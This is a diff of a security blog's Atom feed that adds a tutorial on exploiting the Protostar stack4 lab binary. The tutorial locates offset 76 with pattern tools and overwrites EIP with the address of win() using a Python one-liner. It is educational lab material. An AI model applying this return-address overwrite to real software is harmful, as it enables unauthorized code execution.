@@ -1,4 +1,60 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-12T16:21:10+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Oz</title><link href="http://localhost:4000/hack-the-box/oz/" rel="alternate" type="text/html" title="Hack The Box - Oz" /><published>2019-01-12T00:00:00+02:00</published><updated>2019-01-12T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/oz</id><content type="html" xml:base="http://localhost:4000/hack-the-box/oz/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-14T19:28:50+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4</title><link href="http://localhost:4000/binary-exploitation/bof4/" rel="alternate" type="text/html" title="Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4" /><published>2019-01-14T00:00:00+02:00</published><updated>2019-01-14T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof4</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof4/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
+&lt;h4 id=&quot;hey-again-todays-article-is-going-to-be-short-so-last-time-i-solved-stack3--im-back-again-and-today-im-going-to-solve-stack4-which-is-really-interesting--its-slightly-different-from-stack3-but-that-difference-is-a-new-thing-to-see-if-we-compare-it-to-the-previous-challenges-so-lets-not-talk-too-much-and-jump-right-in&quot;&gt;Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in.&lt;/h4&gt;
+&lt;h4 id=&quot;read-my-other-articles-about-buffer-overflow&quot;&gt;Read my &lt;a href=&quot;/categories&quot;&gt;other articles about buffer overflow&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF4/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;stack4&quot;&gt;./stack4&lt;/h3&gt;
+&lt;h4 id=&quot;lets-take-a-look-at-the-source-code-first-&quot;&gt;Let’s take a look at the source code first :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+void win()
+{
+ printf(&quot;code flow successfully changed\n&quot;);
+}
+
+int main(int argc, char **argv)
+{
+ char buffer[64];
+
+ gets(buffer);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;very-simple--it-defines-the-win-function-then-defines-the-main-function-which-sets-a-buffer-of-64-chars-and-stores-our-input-in-it-but-wait-a-second-where-is-the-variable-that-were-gonna-overwrite--in-the-previous-challenges-we-had-a-variable-that-is-being-used-by-a-function-to-change-the-code-flow--now-what-will-we-overwrite-&quot;&gt;Very simple ! it defines the &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; function then defines the &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ?&lt;/h4&gt;
+&lt;h4 id=&quot;the-answer-is-the-eip-which-is-the-instruction-pointer-and-the-instruction-pointer-is-a-memory-address-that-holds-the-address-of-the-next-instruction-in-the-program-during-execution-so-if-we-overwrite-that-address-the-program-will-execute-whatever-that-address-refers-to-lets-try-to-exceed-the-buffer&quot;&gt;The answer is the &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt; which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer.&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 64&quot;&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF4/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-program-didnt-even-crash--why--because-the-return-address-is-not-directly-after-the-buffer-like-in-the-previous-challenges--lets-try-100-chars&quot;&gt;The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 100&quot;&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF4/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-program-crashed--lets-find-where-does-it-exactly-crash-like-we-did-in-the-previous-challenge-read-it-if-you-havent-done-yet&quot;&gt;The program crashed , Let’s find where does it exactly crash like we did in the &lt;a href=&quot;/binary-exploitation/bof3&quot;&gt;previous challenge&lt;/a&gt; read it if you haven’t done yet.&lt;/h4&gt;
+&lt;h4 id=&quot;we-will-create-a-pattern-with-pattern_create&quot;&gt;We will create a pattern with &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_create.rb -l 100&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF4/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-we-will-pass-it-to-the-program-in-gdb&quot;&gt;Then we will pass it to the program in gdb&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF4/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-crashes-at-0x63413563&quot;&gt;It crashes at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x63413563&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;we-locate-that-with-pattern_offset&quot;&gt;We locate that with pattern_offset&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./pattern_offset.rb -q 63413563&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF4/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-get-exact-match-at-offset-76&quot;&gt;We get exact match at offset 76&lt;/h4&gt;
+&lt;h4 id=&quot;next-step-is-to-find-the-address-of-win&quot;&gt;Next step is to find the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF4/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;the-address-is-0x080483f4&quot;&gt;The address is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x080483f4&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;now-we-can-build-our-exploit-&quot;&gt;Now we can build our exploit :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c &quot;print 'A' * 76 + '\xf4\x83\x04\x08'&quot; | ./stack4&lt;/code&gt;
+&lt;img src=&quot;/images/binary-exploitation/BOF4/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-successfully-changed-the-code-flow-&quot;&gt;And we successfully changed the code flow !&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated&quot;&gt;That’s it , feedback is appreciated.&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading-&quot;&gt;Thanks for reading !&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey again ,Today’s article is going to be short. So last time I solved stack3 , I’m back again and today I’m going to solve stack4 which is really interesting , it’s slightly different from stack3 but that difference is a new thing to see if we compare it to the previous challenges. So let’s not talk too much and jump right in. Read my other articles about buffer overflow ./stack4 Let’s take a look at the source code first : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void win() { printf(&quot;code flow successfully changed\n&quot;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Very simple ! it defines the win function then defines the main function which sets a buffer of 64 chars and stores our input in it. But wait a second where is the variable that we’re gonna overwrite ? in the previous challenges we had a variable that is being used by a function to change the code flow , now what will we overwrite ? The answer is the EIP which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer. python -c &quot;print 'A' * 64&quot; The program didn’t even crash … why ? Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars python -c &quot;print 'A' * 100&quot; The program crashed , Let’s find where does it exactly crash like we did in the previous challenge read it if you haven’t done yet. We will create a pattern with pattern_create ./pattern_create.rb -l 100 Then we will pass it to the program in gdb It crashes at 0x63413563 We locate that with pattern_offset ./pattern_offset.rb -q 63413563 We get exact match at offset 76 Next step is to find the address of win() objdump -d The address is 0x080483f4 Now we can build our exploit : python -c &quot;print 'A' * 76 + '\xf4\x83\x04\x08'&quot; | ./stack4 And we successfully changed the code flow ! That’s it , feedback is appreciated. Thanks for reading !</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF4/0.png" /></entry><entry><title type="html">Hack The Box - Oz</title><link href="http://localhost:4000/hack-the-box/oz/" rel="alternate" type="text/html" title="Hack The Box - Oz" /><published>2019-01-12T00:00:00+02:00</published><updated>2019-01-12T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/oz</id><content type="html" xml:base="http://localhost:4000/hack-the-box/oz/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-im-back-with-another-hack-the-box-write-up--this-time-oz-has-retired-and-it-was-rated-as-a-hard-box-i-enjoyed-this-box--it-was-really-fun-it-had-some-docker-tricks-which-were-very-cool--its-a-linux-box-and-its-ip-is-10101096-so-lets-jump-right-in&quot;&gt;Hey I’m back with another Hack The Box write-up , this time Oz has retired and it was rated as a hard box. I enjoyed this box , it was really fun. It had some docker tricks which were very cool , It’s a linux box and it’s ip is 10.10.10.96 so let’s jump right in.&lt;/h4&gt;
